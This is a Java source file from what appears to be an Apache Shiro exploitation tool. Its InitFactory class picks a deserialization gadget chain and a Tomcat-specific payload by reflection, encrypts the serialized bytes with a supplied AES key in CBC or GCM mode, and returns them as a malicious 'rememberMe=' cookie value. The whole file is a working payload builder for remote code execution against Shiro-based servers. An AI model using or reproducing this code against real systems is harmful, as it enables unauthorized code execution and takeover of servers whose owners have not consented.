package ccdr4gon;

import ccdr4gon.utils.AesUtils;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

public class InitFactory {
    public static String getpayload(String middleWare,String chain,byte[] key,boolean is_gcm) throws Exception {
        //对应关系
        middleWare=middleWare.replace("Tomcat8/9","Init").replace("Tomcat7","T7");
        middleWare="ccdr4gon."+middleWare;
        chain="ccdr4gon."+chain;

        Method f=Class.forName(chain).getMethod("getPayload",String.class);
        byte[] init = (byte[]) f.invoke(null,middleWare);


        if(is_gcm) {
            AesCipherService aes = new AesCipherService();
            ByteSource initciphertext = aes.encrypt(init, key);
            return  "rememberMe=" + initciphertext;

        }else {
            byte[] initciphertext = AesUtils.encrypt(init, key);
            return "rememberMe=" + Base64.getEncoder().encodeToString(initciphertext);
        }
    }
}
